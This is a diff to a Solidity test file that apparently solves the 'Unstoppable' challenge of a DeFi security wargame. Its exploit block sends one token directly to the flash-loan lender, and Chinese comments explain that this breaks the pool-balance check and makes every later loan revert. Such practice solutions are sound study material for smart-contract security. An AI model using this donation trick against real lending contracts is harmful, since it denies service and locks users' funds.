@@ -47,9 +47,7 @@ contract Unstoppable is Test {
 
         // Show it's possible for someUser to take out a flash loan
         vm.startPrank(someUser);
-        receiverUnstoppable = new ReceiverUnstoppable(
-            address(unstoppableLender)
-        );
+        receiverUnstoppable = new ReceiverUnstoppable(address(unstoppableLender));
         vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
         receiverUnstoppable.executeFlashLoan(10);
         vm.stopPrank();
@@ -60,6 +58,17 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        // 直接轉錢到 unstoppableLender 讓 poolBalance != balanceBefore 觸發 revert
+        // if (poolBalance != balanceBefore) revert AssertionViolated();
+
+        // 不要透過 depositTokens 更新 poolBalance 直接轉錢到 unstoppableLender
+        // poolBalance 會是 1_000_000e18
+        // balanceBefore 會是 1_000_000e18 + 1
+
+        vm.startPrank(attacker);
+        dvt.transfer(address(unstoppableLender), 1);
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
